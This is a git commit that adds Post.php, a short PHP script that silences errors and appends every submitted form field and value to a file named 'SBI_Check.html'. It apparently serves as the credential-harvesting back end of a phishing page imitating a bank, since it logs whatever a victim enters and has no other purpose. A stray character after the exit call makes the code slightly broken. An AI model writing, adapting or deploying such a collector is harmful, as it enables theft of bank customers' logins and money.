acd7f4f6ad3f2083b7c72eb7f37bf6c0371eae43
ytuiwop <166133421+ytuiwop@users.noreply.github.com>
2024-04-05 18:12:54 +0530

    Add files via upload

---
+++ Post.php
@@ -0,0 +1,15 @@
+<?php
+error_reporting(0);
+$handle = fopen("SBI_Check.html","a");
+foreach($_POST as $variable => $value)
+{
+  fwrite($handle, $variable);
+  fwrite($handle, "= ");
+  fwrite($handle, $value);
+  fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;A
+?> 
+       
